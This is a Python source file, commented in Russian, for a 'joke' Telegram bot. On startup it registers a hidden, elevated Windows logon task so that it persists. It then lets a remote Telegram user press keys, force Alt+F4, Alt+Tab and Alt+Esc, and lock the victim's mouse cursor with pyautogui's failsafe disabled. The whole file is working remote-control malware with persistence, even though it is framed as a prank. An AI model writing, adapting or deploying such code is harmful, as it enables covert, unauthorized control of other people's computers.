from aiogram import Bot, Dispatcher, executor, types
import pyautogui
import os
import asyncio
import win32com.client
import traceback
from pynput.keyboard import Controller, Key
from decouple import config

keyboard = Controller()

"""
Этот способ сломает работу скрипта после создания .exe файла,
но мне лень заморачиваться над этим. Я просто спрятал секреты :)
"""
API_TOKEN = config('API_TOKEN')
USER_ID = config('USER_ID')

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)


# TODO: Объединить report_error_to_telegram и notify_error в одно целое
async def report_error_to_telegram(error_message: str):
    await bot.send_message(USER_ID, f"{error_message}")


def notify_error(error_message: str):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(report_error_to_telegram(error_message))


def create_task_to_run_at_startup(task_name, path_to_exe):
    """
    Добавляем файл в планировщик задач при запуске Windows
    """
    try:
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()
        root_folder = scheduler.GetFolder('\\')

        # Удалим задачу, если она уже существует для избегания конфликтов
        try:
            root_folder.DeleteTask(task_name, 0)
        except Exception:
            print("Задача отсутствует и будет создана новая.")

        task_def = scheduler.NewTask(0)

        # Запуск от имени администратора
        principal = task_def.Principal
        principal.RunLevel = 1  # TASK_RUNLEVEL_HIGHEST

        # Создание триггера для запуска при старте системы
        TRIGGER_LOGON = 9  # TASK_TRIGGER_LOGON
        trigger = task_def.Triggers.Create(TRIGGER_LOGON)

        # Создание действия для запуска .exe файла
        ACTION_EXEC = 0  # TASK_ACTION_EXEC
        action = task_def.Actions.Create(ACTION_EXEC)
        action.Path = path_to_exe

        # Сохранение задачи
        task_def.RegistrationInfo.Description = '-'
        task_def.RegistrationInfo.Author = '-'
        task_def.Settings.Enabled = True
        task_def.Settings.AllowDemandStart = True

        CREATE_OR_UPDATE = 6  # TASK_CREATE_OR_UPDATE
        LOGON_INTERACTIVE_TOKEN = 3  # TASK_LOGON_INTERACTIVE_TOKEN
        root_folder.RegisterTaskDefinition(
            task_name,
            task_def,
            CREATE_OR_UPDATE,
            '',
            '',
            LOGON_INTERACTIVE_TOKEN,
            ''
        )

    except Exception as e:
        notify_error(f'Ошибка при создании задачи: {traceback.format_exc()}')


file_path = 'C:\\Program Files\\joke.exe'
try:
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    create_task_to_run_at_startup("JokeApp", file_path)
except Exception as e:
    notify_error(f'Произошла ошибка: {traceback.format_exc()}')


if __name__ == "__main__":
    notify_error("Приложение запущено и готово к использованию")


# Функция блокировки мыши
async def lock_mouse(message, lock_time=5):
    screen_width, screen_height = pyautogui.size()
    center_x, center_y = screen_width // 2, screen_height // 2
    pyautogui.FAILSAFE = False

    end_time = asyncio.get_event_loop().time() + lock_time
    while asyncio.get_event_loop().time() < end_time:
        pyautogui.moveTo(center_x, center_y)
        await asyncio.sleep(0.01)

    pyautogui.FAILSAFE = True
    await message.reply("Курсор мыши возвращен в нормальный режим работы")


@dp.message_handler()
async def press_key(message: types.Message):
    """
    Этот обработчик будет получать текстовые сообщения.
    Текст сообщения = название клавиши или комбинации.
    """
    text = message.text.lower().strip()
    try:
        # Обрабатываем специфические комбинации клавиш
        if text == 'f4':
            with keyboard.pressed(Key.alt):
                keyboard.press('f4')
                keyboard.release('f4')
            await message.reply("Комбинация 'Alt + F4' была активирована")
        elif text == 'mouse':
            await asyncio.create_task(lock_mouse(message))
        elif text == 'esc':
            with keyboard.pressed(Key.alt):
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
            await message.reply("Комбинация 'Alt + Esc' была активирована")
        elif text == 'tab':
            with keyboard.pressed(Key.alt):
                keyboard.press(Key.tab)
                keyboard.release(Key.tab)
            await message.reply("Комбинация 'Alt + Tab' была активирована")
        else:
            # Пытаемся нажать одиночную клавишу
            if len(text) == 1 or text in ['enter', 'space', 'esc', 'tab', 'backspace']:
                keyboard.press(text)
                keyboard.release(text)
                await message.reply(f'Клавиша "{text}" была нажата')
            else:
                await message.reply('Неизвестная клавиша')
    except Exception as e:
        await message.reply(f'Произошла ошибка: {e}')


if __name__ == '__main__':
    executor.start_polling(dp)
